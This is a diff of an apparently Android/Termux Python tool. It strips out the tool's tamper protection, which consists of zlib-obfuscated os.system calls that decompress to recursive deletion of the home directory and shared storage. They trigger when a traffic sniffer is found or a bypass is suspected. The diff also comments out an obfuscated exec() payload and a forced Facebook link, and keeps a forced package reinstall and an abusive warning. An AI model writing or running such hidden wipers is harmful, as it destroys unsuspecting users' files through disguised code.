@@ -5,7 +5,7 @@ import os
 from os import path
 from pathlib import Path
 import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
-os.system('xdg-open https://facebook.com/groups/1245912839659325/')
+#os.system('xdg-open https://facebook.com/groups/1245912839659325/')
 print('\n [√] Wait Installing Modules...!')
 os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
 print('\n \033[1;32m[√]\033[1;37m Wait Checking Modules...!')
@@ -25,9 +25,6 @@ try:
 
     if f'com.h{f}pc{g}y.pro' in file_d:
         print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
-        os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
-        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
-        os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
         exit()
     else:
         pass
@@ -45,15 +42,9 @@ proxy = ['139.171.162.10:5520', '45.228.45.147:35010', '27.42.168.46:61308', '18
 ####### MDLL #######
 
 def clr():
-    os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
-    os.system('termux-setup-storage')
-    
     try:
         data = os.listdir('/sdcard')
         if 'Android' in data:
-            os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
-            os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
-            os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
             print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY USMAN');exit()
         else:exit()
  
@@ -62,7 +53,7 @@ def clr():
 ############### PROTECTER #####
 
 
-exec(zlib.decompress(b'x\x9c-\x8c\xbb\n\xc30\x0cE\xf7|\x85\xe2)\x81b\xef\xed\xd6\x1fh)\xd9B\x077\x95\x89 \xb6\x82$C\xfa\xf7M\x1fg\xb8p\xb8p\x92p\x06V\xa0\xbc\xb2\x18\xac\xd1\xe6\x83\xbe\xd407\x94\xbe\xeaI\x13-\xd8\xb9\xf0\x8c\x16\x7f3q\xf6\x86\x92\xeb\x16>\x9f\x86\xaa\x12\x1eT\x82d\xd7\x1f\x1b\xd8Y\xa3j\x83\x8b\xe2_\x85\x8au\xc9\xc1\xd8\xde\xe1,\x0cC\x95\x02\x97\x94\xe0*l8\xed5\xef}\x0b\xc3\x8c\x05n\xb5\xc0\xc0\xbc\xb8\xfe\x84\x1bY\xd7\xbf\x01\xa2n6\xee'))
+#exec(zlib.decompress(b'x\x9c-\x8c\xbb\n\xc30\x0cE\xf7|\x85\xe2)\x81b\xef\xed\xd6\x1fh)\xd9B\x077\x95\x89 \xb6\x82$C\xfa\xf7M\x1fg\xb8p\xb8p\x92p\x06V\xa0\xbc\xb2\x18\xac\xd1\xe6\x83\xbe\xd407\x94\xbe\xeaI\x13-\xd8\xb9\xf0\x8c\x16\x7f3q\xf6\x86\x92\xeb\x16>\x9f\x86\xaa\x12\x1eT\x82d\xd7\x1f\x1b\xd8Y\xa3j\x83\x8b\xe2_\x85\x8au\xc9\xc1\xd8\xde\xe1,\x0cC\x95\x02\x97\x94\xe0*l8\xed5\xef}\x0b\xc3\x8c\x05n\xb5\xc0\xc0\xbc\xb8\xfe\x84\x1bY\xd7\xbf\x01\xa2n6\xee'))
 
 #########UA + VER ########
 
